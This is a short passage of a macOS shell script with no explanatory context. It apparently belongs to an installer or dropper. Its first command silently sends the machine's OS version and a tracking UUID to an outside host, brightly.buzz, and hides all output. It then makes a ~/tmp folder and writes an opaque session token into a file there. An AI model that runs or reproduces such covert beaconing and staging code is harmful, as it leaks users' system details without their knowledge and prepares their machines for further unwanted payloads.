...
curl -s "https://brightly.buzz/post_info?uuid=b226fe79-3932-4b22-9127-dca2158ef35e&os=$(/usr/bin/sw_vers -productVersion)" > /dev/null 2>&1

cd ~
mkdir tmp
cd ~/tmp
echo SESSION=c9/464DAI2bxnT4PZm17+ZmQD6ZJpiA0oBrGE5hVFB7/yspjmEjiRjtI5KwMic4yKw6OCt6i6Gv1x6Vddw8iUw== > context
